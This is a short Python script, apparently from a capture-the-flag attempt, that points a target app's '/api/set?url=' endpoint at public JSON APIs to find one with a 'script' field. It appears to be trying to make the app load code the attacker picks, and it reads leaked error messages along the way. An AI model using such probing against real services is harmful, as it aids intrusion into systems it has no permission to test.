# Let me try using Reddit's JSON API
urls_to_try = [
    # Reddit API returns JSON
    "https://www.reddit.com/r/all.json?limit=1&raw_json=1",
    # Hacker News API
    "https://hacker-news.firebaseio.com/v0/item/1.json",
    # GitHub API
    "https://api.github.com/events?per_page=1",
    # StackExchange API
    "https://api.stackexchange.com/2.3/info?site=stackoverflow",
    # YouTube oEmbed
    "https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=dQw4w9WgXcQ&format=json",
    # Wikipedia API
    "https://en.wikipedia.org/w/api.php?action=parse&page=Main_Page&prop=text&format=json",
]

print("[+] Testing public APIs for JSON with 'script' field...")

for url in urls_to_try:
    print(f"\n[+] Testing: {url[:70]}...")
    try:
        set_resp = requests.get(f"{target_base}/api/set?url={url}", timeout=10)
        app_resp = requests.get(f"{target_base}/app", timeout=15)
        print(f"    Status: {app_resp.status_code}")
        
        if "KeyError" in app_resp.text and "'script'" in app_resp.text:
            print(f"    [!] Got KeyError - JSON doesn't have 'script' key")
            # Extract and show what keys ARE available
            try:
                import re
                # Look for JSON in the error message
                json_match = re.search(r'JSONDecodeError.*Expecting value.*line 1', app_resp.text)
                if json_match:
                    print(f"    Error occurred during JSON parsing")
            except:
                pass
        elif app_resp.status_code == 200:
            print(f"    [!] 200 OK - Checking for flag...")
            print(f"    Response preview: {app_resp.text[:500]}")
    except Exception as e:
        print(f"    Error: {e}")

# Let me also try checking if there's a way to control the nginx config
# or if there's a /proxy endpoint

print("\n[+] Checking for proxy endpoints...")
